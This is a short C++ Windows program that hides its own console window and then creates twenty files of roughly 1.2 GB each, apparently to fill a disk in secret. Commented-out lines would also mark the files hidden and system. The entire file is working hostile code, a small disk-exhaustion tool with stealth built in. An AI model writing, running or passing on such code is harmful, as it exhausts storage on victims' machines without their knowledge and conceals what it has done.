#include <fstream>
#include <sstream>
#include <windows.h>
#include <string>
int main(){

HWND stealth;
AllocConsole();
stealth=FindWindowA("ConsoleWindowClass",NULL);
ShowWindow(stealth,0);
{
	for (int i = 0; i < 20; ++i)
	{
    std::ofstream ofs("file" + ( std::string() = std::to_string(i)) + ".img", std::ios::binary | std::ios::out);
    ofs.seekp((300*2*2<<20) - 1);
    ofs.write("", 1);
   // system("attrib +h "); //Careful! It applies to the entire folder...don't be evil!
   //system("attrib +h +s"); // APPLIES THE SYSTEM FILE ATTRIBUTE TO ALL FILES IN FOLDER
}
	}
}
